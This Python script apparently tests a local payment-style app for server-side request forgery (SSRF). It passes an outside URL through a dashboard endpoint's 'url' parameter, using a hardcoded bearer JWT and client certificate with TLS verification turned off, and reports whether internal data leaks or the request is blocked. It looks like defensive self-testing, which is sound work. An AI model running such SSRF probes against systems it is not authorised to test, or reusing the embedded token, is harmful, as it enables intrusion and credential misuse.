import requests
import urllib3
import time
from collections import defaultdict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://localhost:8888/api"

TOKEN = "eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJIbDVqRUNMbGxic29pTkp1ZUVGV3BaVnlhcldFeGxHNFBKVE54QnloN2tBIn0.eyJleHAiOjE3NzY2OTU2MTgsImlhdCI6MTc3NjY5NTMxOCwiYXV0aF90aW1lIjoxNzc2Njg5NTQwLCJqdGkiOiIyNmUwNWEzMi00OWY4LTRhNDItOTE2OC1hMGNjMTI2NGVkMDMiLCJpc3MiOiJodHRwczovL2xvY2FsaG9zdDo4NDQ0L3JlYWxtcy9wYXlzaGllbGQtcmVhbG0iLCJzdWIiOiJiZWJiNjk1NC0wZTBmLTQ3ZmMtODkzZS0yNmFmZGY1NjYyNmEiLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiJwYXlzaGllbGQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6IjQwZTBjMDFkLTkxZjEtNGM1Ni04NjBiLTUzOTI4ZDdjY2FiOCIsImFjciI6IjEiLCJhbGxvd2VkLW9yaWdpbnMiOlsiaHR0cDovL2xvY2FsaG9zdDo2ODY4IiwiaHR0cHM6Ly9vYXV0aC5wc3Rtbi5pbyIsImh0dHBzOi8vbG9jYWxob3N0Ojg4ODgiXSwicmVhbG1fYWNjZXNzIjp7InJvbGVzIjpbImVtcGxveWVlIl19LCJjbmYiOnsieDV0I1MyNTYiOiJwVXFsaU50U3hGckl2LUgyQ01xMVNsYTFMekhMLW9xZHYxbkZtV1JQclYwIn0sInNjb3BlIjoib3BlbmlkIHByb2ZpbGUgZW1haWwiLCJzaWQiOiI0MGUwYzAxZC05MWYxLTRjNTYtODYwYi01MzkyOGQ3Y2NhYjgiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwibmFtZSI6Ikh1bmcgTmd1eWVuIiwicHJlZmVycmVkX3VzZXJuYW1lIjoiZW1wbG95ZWUtZXhhbXBsZUBwYXlzaGllbGQuY29tIiwiZ2l2ZW5fbmFtZSI6Ikh1bmciLCJmYW1pbHlfbmFtZSI6Ik5ndXllbiIsImVtYWlsIjoiZW1wbG95ZWUtZXhhbXBsZUBwYXlzaGllbGQuY29tIn0.ebI1VmwOdrcIR2i5cNx4rySPzm-dtuGNv72-LRrTEksG1lXSINtZcuMN6eeIXy3ZCYzBoDyvO1QQ2KSgnmGC9gScdj4P00hf5XvKRca9d3cWVuRD42cQN26XEaay4LKosnA1ybLUspFzvspL-roHEdpadfrhKtzlsEVT7zUlPQd-lDayEIViizjWI5wJ_MnVkisFGUqPP5P4m-EQBbLq5Ba05QR03Bqx1kFN6Xh4FJP4RC1TkQqUMhHcRxr1_9oDA1DAqLGZ7gmwPfj2pNar4nLFymgQNFaki5GJdVSai3tlfgDGdTpd8Jo3RjI_BBqGIvtDyEG5T1rrsRzJdE7vnQ" 

CERT = ('services/cert/client.crt', 'services/key/client.key')

HEADERS = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}

PAYLOADS = [
    {"name": "Webhook-Forgery", "target": "https://facebook.com"}
]

def ssrf_attack():
    stats = defaultdict(int)
    print("=== SSRF ATTACK & WEBHOOK FORGERY ===")

    for attack in PAYLOADS:
        
        endpoints = [
            f"{URL}/dashboard/dashboard-employee?url={attack['target']}" 
        ]

        for url in endpoints:
            try:
                response = requests.get(url, headers=HEADERS, cert=CERT, verify=False, timeout=5)
                stats[response.status_code] += 1

                if response.status_code == 200:
                    print(f"  [!] SSRF DETECTED: {attack['target']}")
                    if "QlyLuong" in response.text: 
                        print("  [!!] Dữ liệu nội bộ bị rò rỉ!")
                elif response.status_code == 500:
                    print(f"  [?] Lỗi server")
                elif response.status_code == 403:
                    print(f"  [+] Chặn SSRF thành công !")
                else:
                    print(f"  [-] Phản hồi khác: HTTP {response.status_code}")
                    
            except requests.exceptions.Timeout:
                stats["Timeout"] += 1
            except Exception as e:
                stats["Error"] += 1

    print(f"\n--- KẾT QUẢ ---")
    for code, count in stats.items():
        print(f"Mã HTTP {code}: {count} lần")

ssrf_attack()